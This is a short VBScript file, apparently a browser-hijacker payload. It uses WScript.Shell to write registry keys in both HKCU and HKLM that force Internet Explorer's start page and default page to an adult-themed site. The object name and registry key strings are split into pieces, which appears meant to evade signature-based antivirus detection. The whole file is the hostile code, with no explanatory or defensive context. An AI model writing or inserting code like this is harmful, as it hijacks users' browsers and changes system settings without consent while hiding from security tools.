Set wscr=CreateObject("WSc"+"ript.Shell")
wscr.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\St"+"art Page", "http://www.cool-xxx.net/index.html" 
wscr.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Star"+"t Page", "http://www.cool-xxx.net/index.html"
wscr.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Default_P"+"age_URL", "http://www.cool-xxx.net/index.html"
